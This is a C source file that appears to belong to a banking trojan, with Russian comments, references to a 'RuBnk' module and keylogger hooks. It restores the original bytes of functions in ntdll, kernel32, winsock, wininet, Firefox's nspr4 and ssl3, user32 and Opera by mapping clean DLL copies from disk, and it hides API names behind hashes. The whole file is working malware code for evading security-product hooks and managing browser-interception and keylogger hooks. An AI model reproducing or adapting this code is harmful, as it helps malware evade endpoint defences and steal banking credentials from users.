#include <windows.h>

#include "GetApi.h"
#include "Memory.h"
#include "Strings.h"
#include "Utils.h"
#include "BotUtils.h"

void WINAPI UnhookFunc( LPVOID hMap, WCHAR *Dll, DWORD dwProcNameHash )
{
	PIMAGE_OPTIONAL_HEADER poh  = (PIMAGE_OPTIONAL_HEADER)( (char*)hMap + ( (PIMAGE_DOS_HEADER)hMap)->e_lfanew + sizeof( DWORD ) + sizeof( IMAGE_FILE_HEADER ) );
	PIMAGE_EXPORT_DIRECTORY ped = (IMAGE_EXPORT_DIRECTORY*)RVATOVA( hMap, poh->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress );	
	ULONG *functionEntryPoints  = (ULONG*)( (ULONG)hMap + ped->AddressOfFunctions );
				
	int nOrdinal;

	if ( HIWORD( (DWORD)dwProcNameHash) == 0 ) 
	{
		nOrdinal = (LOWORD((DWORD)dwProcNameHash)) - ped->Base;
	}
	else
	{
		DWORD *pdwNamePtr  = (DWORD*)RVATOVA(hMap, ped->AddressOfNames);
		WORD *pwOrdinalPtr = (WORD*)RVATOVA(hMap, ped->AddressOfNameOrdinals);

		unsigned int i = 0;

		BYTE entryPointBytes[10];
		BYTE originalBytes[10];

		DWORD dwImageBase = (DWORD)GetDllBase( CalcHashW( Dll ) );

		if ( !dwImageBase )
		{
			return;
		}

		for ( i = 0; i < ped->NumberOfNames; i++, pdwNamePtr++, pwOrdinalPtr++ )
		{
			if ( CalcHash( (char*)RVATOVA( hMap, *pdwNamePtr ) ) == dwProcNameHash )
			{
				ULONG entryVA = dwImageBase + functionEntryPoints[i];
				ULONG entryMA =	( (ULONG)hMap  + functionEntryPoints[i] );

				m_memcpy( originalBytes, (PVOID)entryMA, 10 );
				m_memcpy( entryPointBytes, (LPVOID)entryVA, 10 );

		    	if ( m_memcmp( entryPointBytes, originalBytes, 10 ) )
				{
					DWORD dwOldProtect;

					if ( (BOOL)pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, PAGE_EXECUTE_READWRITE, &dwOldProtect ) )
					{
						m_memcpy( (LPVOID)entryVA, (LPCVOID)originalBytes, 10 );
						pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, dwOldProtect, &dwOldProtect );
					}

					break;
				}
			}				
		}
	}

	return;
}

WCHAR *CopyDllToTemp( WCHAR *Dll, bool bIsSystem )
{
	WCHAR *SystemDll = (WCHAR*)MemAlloc( 512 );

	if ( SystemDll == NULL )
	{
		return NULL;
	}

	if ( bIsSystem )
	{
		pGetSystemDirectoryW( SystemDll, MAX_PATH );
		plstrcatW( SystemDll, L"\\");
	}
	else
	{
		pGetModuleFileNameW( (HMODULE)pGetModuleHandleW( NULL ), SystemDll, 255 );

		for ( DWORD i = m_wcslen( SystemDll ) - 1; i > 0; i-- )
		{
			if ( SystemDll[i] == '\\' )
			{
				SystemDll[i + 1] = '\0';
				break;
			}
		}
	}

	plstrcatW( SystemDll, Dll );

	WCHAR *DllPath = GetTempName();

	if ( DllPath != NULL )
	{
		if ( !(BOOL)pCopyFileW( SystemDll, DllPath, FALSE ) )
		{
			MemFree( SystemDll );
			return NULL;
		}
	}

	MemFree( SystemDll );
	return DllPath;
}


void WINAPI RestoreFuncs( WCHAR *Dll, DWORD *dwFuncMass, bool bIsSystem )
{
	WCHAR *TempDll = CopyDllToTemp( Dll, bIsSystem );

	if ( TempDll == NULL )
	{
		return;
	}

	HANDLE hFile = pCreateFileW( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
	
	HANDLE	hMapping = NULL;
	LPVOID	hMap     = NULL;
	
	if ( hFile != INVALID_HANDLE_VALUE ) 
	{
		hMapping = pCreateFileMappingW( hFile, 0, PAGE_READONLY | SEC_IMAGE, 0, 0, 0 );

		if ( hMapping != INVALID_HANDLE_VALUE )
		{
			hMap = pMapViewOfFile( hMapping, FILE_MAP_READ, 0, 0, 0 );

			if ( hMap )
			{
				for ( DWORD i = 0; dwFuncMass[i] != 0; i++ )
				{
					UnhookFunc( hMap, Dll, dwFuncMass[i] );
				}
			}
		}
	}

	pUnmapViewOfFile( hMap );

	pCloseHandle( hMapping );
	pCloseHandle( hFile );

	pDeleteFileW( TempDll );
	MemFree( TempDll );

	return;
}
/************************************************************************/
//* Восстанавливает неэкспорируемую функцию по её VA                    */
void WINAPI UnhookFunc2( LPVOID hMap, WCHAR *Dll, DWORD dwProcVA )
{
	BYTE entryPointBytes[10];
	BYTE originalBytes[10];

	DWORD dwImageBase = (DWORD)GetDllBase( CalcHashW( Dll ) );

	if ( !dwImageBase )
		{
			return;
		}

	ULONG entryVA = dwImageBase + dwProcVA;
	ULONG entryMA =	( (ULONG)hMap  + dwProcVA );

	m_memcpy( originalBytes, (PVOID)entryMA, 10 );
	m_memcpy( entryPointBytes, (LPVOID)entryVA, 10 );


	if ( m_memcmp( entryPointBytes, originalBytes, 10 ) )
		{
			DWORD dwOldProtect;

			if ( (BOOL)pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, PAGE_EXECUTE_READWRITE, &dwOldProtect ) )
				{
					m_memcpy( (LPVOID)entryVA, (LPCVOID)originalBytes, 10 );
					pVirtualProtectEx( (HANDLE)-1, (LPVOID)entryVA, 10, dwOldProtect, &dwOldProtect );
				}
		}

	return;
}


/************************************************************************/
/* Восстанавливает вектор неэкспортируемых функций по их VA             */
void WINAPI RestoreFuncs2( WCHAR *Dll, DWORD *dwFuncMass, bool bIsSystem )
{
	WCHAR *TempDll = CopyDllToTemp( Dll, bIsSystem );

	if ( TempDll == NULL )
	{
		return;
	}

	HANDLE hFile = pCreateFileW( TempDll, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
	
	HANDLE	hMapping = NULL;
	LPVOID	hMap     = NULL;
	
	if ( hFile != INVALID_HANDLE_VALUE ) 
	{
		hMapping = pCreateFileMappingW( hFile, 0, PAGE_READONLY | SEC_IMAGE, 0, 0, 0 );

		if ( hMapping != INVALID_HANDLE_VALUE )
		{
			hMap = pMapViewOfFile( hMapping, FILE_MAP_READ, 0, 0, 0 );

			if ( hMap )
			{
				for ( DWORD i = 0; dwFuncMass[i] != 0; i++ )
				{
					UnhookFunc2( hMap, Dll, dwFuncMass[i] );
				}
			}
		}
	}

	pUnmapViewOfFile( hMap );

	pCloseHandle( hMapping );
	pCloseHandle( hFile );

	pDeleteFileW( TempDll );
	MemFree( TempDll );

	return;
}

WCHAR ieframe_dll[]  = {'i','e','f','r','a','m','e','.','d','l','l',0};
WCHAR kernel32_dll[] = {'k','e','r','n','e','l','3','2','.','d','l','l',0};
WCHAR user32_dll[]   = {'u','s','e','r','3','2','.','d','l','l',0};
WCHAR ws2_32_dll[]   = {'w','s','2','_','3','2','.','d','l','l',0};
WCHAR ntdll_dll[]    = {'n','t','d','l','l','.','d','l','l',0};
WCHAR wininet_dll[]  = {'w','i','n','i','n','e','t','.','d','l','l',0};
WCHAR nspr4_dll[]	 = {'n','s','p','r','4','.','d','l','l',0};
WCHAR ssl3_dll[]	 = {'s','s','l','3','.','d','l','l',0};
//opera
WCHAR opera_dll[]	 = {'o','p','e','r','a','.','d','l','l',0};


//ieframe_dll

//ntdll
#define C_ZWSETCONTEXTTHREAD			0x62E2FE6F
#define C_ZWGETCONTEXTTHREAD			0x62E2D66F
#define C_ZWMAPVIEWOFSECTION			0x594D9A3C
#define C_ZWUNMAPVIEWOFSECTION			0x9ED4D161
#define C_ZWALLOCATEVIRTUALMEMORY		0x594AA9E4
#define C_ZWWRITEVIRTUALMEMORY			0xEEE7AF23
#define C_ZWPROTECTVIRTUALMEMORY		0x3836C63E		
#define C_ZWCREATETHREAD				0xB8C89AF2
#define C_ZWOPENPROCESS					0x9C0AC99D
#define C_ZWOPENTHREAD					0x7E9997A5
#define C_ZWQUEUEAPCTHREAD				0xC0E4F6EE
#define C_ZWTERMINATEPROCESS			0xB318A842			
#define C_ZWTERMINATETHREAD				0xC0C7B366
#define C_ZWRESUMETHREAD				0xACF8BF39
#define C_ZWQUERYDIRECTORYFILE			0x5F8B35D6
#define C_ZWCREATEPROCESS				0xB48C627E
#define C_ZWCREATEPROCESSEX				0x189F8FDB
#define C_ZWCREATEFILE					0xAA1AAC22
#define C_ZWDEVICEIOCONTROLFILE			0x385D3092
#define C_ZWCLOSE						0x3D9A9259
#define C_ZWSETINFORMATIONPROCESS		0xCA2BF652

//kernel32
#define C_CREATEREMOTETHREAD			0xE61874B3
#define C_WRITEPROCESSMEMORY			0xBEA0BF35
#define C_VIRTUALPROTECTEX				0x9BD6888F		
#define C_VIRTUALALLOCEX				0x9ABFB8A6
#define C_GETTHREADCONTEXT				0xAA1DE02F
#define C_SETTHREADCONTEXT				0xAA1DC82F			
#define C_CREATEPROCESSA				0x46318AC7				
#define C_CREATEPROCESSW				0x46318AD1	
#define C_CREATEPROCESSINTERNALA		0xE24394E4
#define C_CREATEPROCESSINTERNALW		0xE24394F2
#define C_CREATEFILEA					0x8F8F114				
#define C_CREATEFILEW					0x8F8F102			
#define C_COPYFILEA						0x2EE4F10D				
#define C_COPYFILEW						0x2EE4F11B				
#define C_COPYFILEEXW					0x3C4277EE				

//ws2_32
#define C_CONNECT						0xEDD8FE8A	
#define C_SEND							0xE797764						
#define C_RECV							0xE5971F6							
#define C_GETHOSTBYNAME					0xF44318C6	

//wininet
#define C_INTERNETOPENA					0x8593DD7
#define C_INTERNETOPENW					0x8593DC1
#define C_INTERNETCONNECTA				0xBE618D3E
#define C_INTERNETCONNECTW				0xBE618D28
#define C_INTERNETOPENURLA				0xB87DBD66
#define C_INTERNETOPENURLW				0xB87DBD70
#define C_HTTPOPENREQUESTA				0x1510002F
#define C_HTTPOPENREQUESTW				0x15100039		
#define C_HTTPSENDREQUESTA				0x9F13856A		
#define C_HTTPSENDREQUESTW				0x9F13857C	
#define C_HTTPSENDREQUESTEXA			0xE15B9B85
#define C_HTTPSENDREQUESTEXW			0xE15B9B93
#define C_INTERNETREADFILE				0x1A212962			
#define C_INTERNETREADFILEEXA			0x2C523864
#define C_INTERNETREADFILEEXW			0x2C523872
#define C_INTERNETQUERYDATAVAILABLE		0x7EDEC584
#define C_INTERNETCLOSEHANDLE			0x7314FB0C
#define C_HTTPADDREQUESTHEADERSA		0xB5901061
#define C_HTTPADDREQUESTHEADERSW		0xB5901077

//nspr4
#define C_PRWRITE						0x7EFB3098
#define C_PRREAD						0xFA583271
#define C_PRCLOSE						0x3D3AB319
#define C_PRCONNECT						0xBF667EA2

//ssl3
#define C_SSLIMPORTFDHASH				0xA1C4E024

//user32
#define C_TRANSLATEMESSAGE				0xC45D9631
#define C_CREATEWINDOWEXW				0xBF7EFB5A
#define C_SHOWWINDOW					0x7506E960
#define C_GETMESSAGEPOS					0x9D2F45DB
#define C_DIALOGBOX_PARAMW				0x929A0EB1
#define C_WINDOWFROMPOINT				0x85F352BD
//кейлогеровские хуки
#define C_PEEKMESSAGEA			0xD7A87C2C
#define C_GETMESSAGEA			0xC8A274AC
#define C_PEEKMESSAGEW			0xD7A87C3A
#define C_GETMESSAGEW			0xC8A274BA

void UnhookDlls()
{
	DWORD dwNtdll[]	  = { C_ZWSETCONTEXTTHREAD, C_ZWGETCONTEXTTHREAD,
						  C_ZWUNMAPVIEWOFSECTION, C_ZWMAPVIEWOFSECTION,
						  C_ZWALLOCATEVIRTUALMEMORY, C_ZWWRITEVIRTUALMEMORY,
						  C_ZWPROTECTVIRTUALMEMORY, C_ZWCREATETHREAD, 
						  C_ZWOPENPROCESS, C_ZWOPENTHREAD,
						  C_ZWQUEUEAPCTHREAD, C_ZWTERMINATEPROCESS, 
						  C_ZWTERMINATETHREAD, C_ZWRESUMETHREAD,
						  C_ZWQUERYDIRECTORYFILE, C_ZWCREATEPROCESS,
						  C_ZWCREATEPROCESSEX, C_ZWCREATEFILE,
						  C_ZWDEVICEIOCONTROLFILE, C_ZWCLOSE,
						  C_ZWSETINFORMATIONPROCESS, 0 };

	DWORD dwKernel[]  = { C_CREATEREMOTETHREAD, C_WRITEPROCESSMEMORY,
						  C_VIRTUALPROTECTEX, C_VIRTUALALLOCEX,
						  C_SETTHREADCONTEXT, C_CREATEPROCESSA,
						  C_CREATEPROCESSINTERNALA, C_CREATEPROCESSINTERNALW,
						  C_CREATEFILEA, C_CREATEFILEW, 
						  C_COPYFILEA, C_COPYFILEW, C_COPYFILEEXW, 0 };

	DWORD dwWinsock[] = { C_CONNECT, C_SEND, C_RECV, C_GETHOSTBYNAME, 0 };
	

	RestoreFuncs( ntdll_dll,     dwNtdll,    true );
	RestoreFuncs( kernel32_dll,  dwKernel,   true );
	RestoreFuncs( ws2_32_dll,    dwWinsock,  true );


	return;
}


void UnhookIE()
{
	DWORD dwWininet[] = { C_INTERNETOPENA, C_INTERNETOPENW,
						  C_INTERNETCONNECTA, C_INTERNETCONNECTW,
						  C_INTERNETOPENURLA, C_INTERNETOPENURLW,
						  C_HTTPOPENREQUESTA, C_HTTPOPENREQUESTW,
						  C_HTTPSENDREQUESTA, C_HTTPSENDREQUESTW,
						  C_HTTPSENDREQUESTEXA, C_HTTPSENDREQUESTEXW,
						  C_INTERNETREADFILE, C_INTERNETREADFILEEXA,
						  C_INTERNETREADFILEEXW, C_INTERNETQUERYDATAVAILABLE,
						  C_HTTPADDREQUESTHEADERSW, C_HTTPADDREQUESTHEADERSA,
						  C_INTERNETCLOSEHANDLE, 0 };

	RestoreFuncs( wininet_dll, dwWininet, true );

	return;
}


void UnhookFF()
{
	DWORD dwNspr4[]	= { C_PRWRITE, C_PRREAD,
						C_PRCLOSE, C_PRCONNECT, 0 };

	DWORD dwSsl3[]	= { C_SSLIMPORTFDHASH, 0 };

	RestoreFuncs( nspr4_dll,  dwNspr4,   false );	
	RestoreFuncs( ssl3_dll,   dwSsl3,    false );

	return;
}


void UnhookUser32()
{
	DWORD dwUser32[] = { C_TRANSLATEMESSAGE, 0 };
	RestoreFuncs( user32_dll, dwUser32,  true );

	return;
}

/// Функции добавленные при добавлении RuBnk
//#ifdef RuBnkH
void UnhookTranslateMessage()
{
	DWORD dwUser32[] = { C_TRANSLATEMESSAGE, 0 };
	RestoreFuncs( user32_dll, dwUser32,  true );

	return;
}
void UnhookCreateFileW()
{
	DWORD dwKernel[]  = { C_CREATEFILEW, 0 };	
	RestoreFuncs( kernel32_dll,  dwKernel,   true );
	return;
}
void UnhookIBancShowCreate()
{
	DWORD dwUser32[] = {C_CREATEWINDOWEXW, C_SHOWWINDOW, 0 };
	RestoreFuncs( user32_dll, dwUser32,  true );

	return;
}
void UnhookShowWindow()
{
	DWORD dwUser32[] = {C_SHOWWINDOW, 0 };
	RestoreFuncs( user32_dll, dwUser32,  true );
	return;
}

//#endif
//удаление кукисов в ие
void UnhookCookie()
{
	DWORD dwUser32[] ={ C_DIALOGBOX_PARAMW, 0 };
	RestoreFuncs( user32_dll,  dwUser32,  true );

	return;
}

/************************************************************************/
void UnhookOpera(DWORD dwAddr)
{
	DWORD dwOpera[] ={ dwAddr, 0 };

	// Opera.dll слинкована динамически, чтобы всё работало
	// нужно подгрузить её в процесс раньше, чем браузер
	pLoadLibraryW(opera_dll);

	RestoreFuncs2( opera_dll, dwOpera,  false );
	return;
}

void UnhookJava()
{
 DWORD dwUser32[] ={ C_SHOWWINDOW, C_GETMESSAGEPOS, C_WINDOWFROMPOINT, 0 };
 RestoreFuncs( user32_dll,    dwUser32,  true );

 return;
}

void UnhookGetMessagePos()
{
 DWORD dwUser32[] ={ C_GETMESSAGEPOS, 0 };
 RestoreFuncs( user32_dll,    dwUser32,  true );

 return;
}
/************************************************************************/
//кейлогеровские хуки
void UnhookKeyLogger()
{
	DWORD dwUser32[] ={ C_PEEKMESSAGEA, C_GETMESSAGEA, C_PEEKMESSAGEW, C_GETMESSAGEW, 0 };
	RestoreFuncs( user32_dll,  dwUser32,  true );

	return;
}
					

				







